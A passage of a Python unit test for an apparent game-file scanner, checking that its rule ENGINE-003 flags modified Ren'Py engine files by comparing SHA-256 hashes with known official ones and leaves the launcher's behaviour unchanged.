        self.assertEqual(len(active(scan(listed, "lib/python2.7/site.py"), "ENGINE-003")), 1)
        # nothing to compare with, or not an engine file: no note
        self.assertEqual(active(scan(unlisted), "ENGINE-003"), [])
        self.assertEqual(active(scan(listed, "game/main.py"), "ENGINE-003"), [])
        # the official file: no note
        digest = hashlib.sha256(changed).hexdigest()
        self.addCleanup(engine_hashes.SCRIPTS.pop, digest, None)
        engine_hashes.SCRIPTS[digest] = ("renpy/main.py", len(engine_hashes.ARCHIVES) - 1)
        self.assertEqual(active(scan(listed), "ENGINE-003"), [])
        # the note does not change what the launcher does
        from gamescan import launcher
        self.assertFalse(launcher._blocks(note))

